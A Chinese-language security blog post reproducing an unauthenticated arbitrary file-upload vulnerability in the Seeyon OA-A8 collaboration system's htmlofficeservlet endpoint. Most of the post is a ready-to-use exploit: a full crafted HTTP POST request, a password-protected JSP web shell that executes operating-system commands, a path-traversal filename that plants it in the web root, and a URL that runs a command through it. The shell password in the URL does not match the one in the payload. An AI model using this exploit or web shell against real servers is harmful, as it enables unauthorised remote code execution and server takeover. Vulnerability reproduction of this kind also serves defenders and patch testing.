---
layout:     post
title:      【漏洞复现】致远OA-A8系统htmlofficeservlet文件上传漏洞复现
subtitle:   文件上传漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---

## 0x00 漏洞说明
该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。
## 0x01 影响版本
致远A8-V5协同管理软件 V6.1sp1
致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3
致远A8+协同管理软件V7.1
## 0x02 漏洞复现
先访问http://IP:PORT/seeyon/htmlofficeservlet 
出现DBSTEP V3.0 0 21 0 htmoffice operate err则可能存在漏洞
![-c717](/img/16027834744587.jpg)
POST数据包进行测试
```
POST /seeyon/htmlofficeservlet HTTP/1.1
Content-Length: 1121
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Host: xxxxxxxxx
Pragma: no-cacheDBSTEP V3.0     355             0               666             
DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("clasee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
```
### payload
```
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("clasee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
```
### filename
```
..\..\..\ApacheJetspeed\webapps\seeyon\testtesta.jsp
```
### shellfileURL
```
/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir
```
成功执行命令
![-c771](/img/16027834904441.jpg)



